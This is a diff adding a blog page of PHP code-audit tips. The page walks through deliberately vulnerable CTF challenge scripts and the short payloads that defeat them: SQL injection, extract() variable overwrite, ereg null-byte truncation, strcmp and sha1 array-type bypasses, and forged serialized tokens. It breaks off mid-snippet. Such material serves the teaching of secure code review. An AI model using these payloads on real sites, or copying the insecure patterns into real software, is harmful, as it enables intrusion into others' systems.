@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                PHP代码审计TIPS |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">PHP代码审计TIPS</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2016-10-01 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.3k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>12 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;number&#x27;]))&#123;</span><br><span class="line">   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_GET, $_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&#x27;number&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $info=&quot;sorry, you cann&#x27;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;])))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">     $info = &quot;number must be equal to it&#x27;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#x27;common.php&#x27;;</span><br><span class="line">    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">    //把一个或多个数组合并为一个数组</span><br><span class="line">    class db</span><br><span class="line">    &#123;</span><br><span class="line">        public $where;</span><br><span class="line">        function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            if(!empty($this-&gt;where))</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;select($this-&gt;where);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function select($where)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql = mysql_query(&#x27;select * from user where &#x27;.$where);</span><br><span class="line">            //函数执行一条 MySQL 查询。</span><br><span class="line">            return @mysql_fetch_array($sql);</span><br><span class="line">            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($requset[&#x27;token&#x27;]))</span><br><span class="line">    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span><br><span class="line">    &#123;</span><br><span class="line">        $login = unserialize(gzuncompress(base64_decode($requset[&#x27;token&#x27;])));</span><br><span class="line">        //gzuncompress:进行字符串压缩</span><br><span class="line">        //unserialize: 将已序列化的字符串还原回 PHP 的值</span><br><span class="line"></span><br><span class="line">        $db = new db();</span><br><span class="line">        $row = $db-&gt;select(&#x27;user=\&#x27;&#x27;.mysql_real_escape_string($login[&#x27;user&#x27;]).&#x27;\&#x27;&#x27;);</span><br><span class="line">        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">        if($login[&#x27;user&#x27;] === &#x27;ichunqiu&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else if($row[&#x27;pass&#x27;] !== $login[&#x27;pass&#x27;])&#123;</span><br><span class="line">            echo &#x27;unserialize injection!!&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&#x27;Location: index.php?error=1&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&#x27;user&#x27; =&gt; &#x27;ichunqiu&#x27;);</span><br><span class="line">$a = base64_encode(gzcompress(serialize($arr)));</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;uname&#x27;]) || !isset($_POST[&#x27;pwd&#x27;])) &#123;</span><br><span class="line">    echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;/form&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;!--source: source.txt--&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line"></span><br><span class="line">//检测变量是否是数组</span><br><span class="line"></span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line"></span><br><span class="line">//返回由数组元素组合成的字符串</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line"></span><br><span class="line">//匹配成功一次后就会停止匹配</span><br><span class="line"></span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line"></span><br><span class="line">//遍历数组</span><br><span class="line"></span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line"></span><br><span class="line">//设置活动的 MySQL 数据库</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &#x27;&#123;$_POST[&#x27;uname&#x27;]&#125;&#x27;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"></span><br><span class="line">//执行一条 MySQL 查询</span><br><span class="line"></span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line"></span><br><span class="line">//返回结果集中行的数目</span><br><span class="line"></span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line"></span><br><span class="line">//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line"></span><br><span class="line">    if($key[&#x27;pwd&#x27;] == $_POST[&#x27;pwd&#x27;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$flag=&#x27;xxx&#x27;; </span><br><span class="line">extract($_GET);</span><br><span class="line"> if(isset($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim(file_get_contents($flag));</span><br><span class="line">    if($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        echo&#x27;ctf&#123;xxx&#125;&#x27;; </span><br><span class="line">    &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123; </span><br><span class="line">    echo&#x27;Oh.no&#x27;;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">变量覆盖漏洞</span><br><span class="line">PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</span><br><span class="line"></span><br><span class="line">file_get_contents：远程获取获取文件，若没有则为空</span><br><span class="line"></span><br><span class="line">构造shiyan=&amp;flag=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) </span><br><span class="line">&#123;</span><br><span class="line">  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)</span><br><span class="line">  &#123;</span><br><span class="line">    echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999)</span><br><span class="line">   &#123;</span><br><span class="line">     if (strpos ($_GET[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE) </span><br><span class="line">      &#123;</span><br><span class="line">      die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;); </span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     else </span><br><span class="line">     &#123;</span><br><span class="line">        echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ereg漏洞</span><br><span class="line">payload：1e9%00*-*</span><br><span class="line">正则%00截断</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) </span><br><span class="line">    //比较两个字符串（区分大小写） </span><br><span class="line">        die(&#x27;Flag: &#x27;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &#x27;离成功更近一步了&#x27;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?a[]=1</span><br></pre></td></tr></table></figure>
+
+<p><a class="link" target="_blank" rel="noopener" href="http://blog.csdn.net/zhaohansk/article/details/43984569">漏洞原理<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在5.3的版本之后使用strcmp函数比较会返回0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) </span><br><span class="line">&#123;</span><br><span class="line">    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])</span><br><span class="line">        echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;;</span><br><span class="line">    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))</span><br><span class="line">      die(&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">===会比较类型，比如bool。</span><br><span class="line">sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型</span><br><span class="line">?name[]=a&amp;password[]=b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    if ($_GET[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])</span><br><span class="line">        die (&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包删掉cookie中的session即可</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&#x27;$user&#x27;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line"></span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line"></span><br><span class="line">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span><br><span 